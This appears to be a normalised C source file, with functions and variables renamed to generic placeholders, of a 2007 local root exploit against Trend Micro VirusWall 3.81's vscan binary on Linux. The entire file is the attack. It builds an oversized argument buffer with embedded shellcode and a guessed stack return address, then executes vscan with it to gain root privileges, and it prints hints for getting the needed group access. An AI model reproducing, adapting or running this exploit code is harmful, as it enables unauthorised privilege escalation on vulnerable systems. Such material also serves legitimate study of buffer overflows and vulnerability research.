
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 int VAR_0 ;
 int FUNC_0 (char*,int) ;
 int FUNC_1 (char*,char*,char*,int *) ;
 int FUNC_2 (int) ;
 unsigned long FUNC_3 () ;
 int FUNC_4 () ;
 scalar_t__ FUNC_5 (int) ;
 int FUNC_6 (int,int ,char*) ;
 int FUNC_7 (char*,int ,int) ;
 int FUNC_8 (char*,...) ;
 int VAR_1 ;
 char* FUNC_9 (int ) ;
 char* VAR_2 ;

int FUNC_10(int VAR_3, char *VAR_4[], char **VAR_5) {


    int VAR_6 = 1120;


    unsigned long VAR_7;


    char *VAR_8;

    FUNC_8("\nLocal root exploit for vscan/VSAPI (=Trend Micro VirusWall 3.81 on Linux)\n");
    FUNC_8("Author: Sebastian Wolfgarten, <sebastian@wolfgarten.com>\n");
    FUNC_8("Date: January 3rd, 2007\n\n");


    if (FUNC_0(VAR_2, 01) != -1) {

        FUNC_8("Okay, %s is executable and by the way, your current user id is %d.\n",VAR_2,FUNC_4());


        if((VAR_8 = (char *)FUNC_5(VAR_6)) == ((void*)0)) {

  FUNC_8("Error allocating memory!\n");
  FUNC_2(-1);

 }


        VAR_7 = FUNC_3();


        FUNC_7(VAR_8, VAR_0, VAR_6);


        FUNC_6(VAR_8 + VAR_6 - FUNC_9(VAR_1) - 8, VAR_1, FUNC_9(VAR_1));


        *(long *)&VAR_8[VAR_6 - 4] = VAR_7;


        FUNC_8("\nExecuting %s. Afterwards check your privilege level with id or whoami!\n",VAR_2);
        FUNC_1(VAR_2, "vscan", VAR_8, ((void*)0));

    } else {

        FUNC_8("Exploit failed. You seem not to have enough privileges to execute %s, sorry.\n",VAR_2);
 FUNC_8("Hint: Ask your local admin to add yourself to the iscan group or let him make the vscan binary world-executable.\n");
 FUNC_8("Then try again :-)\n\n");
 FUNC_2(1);

    }

    return 0;

}
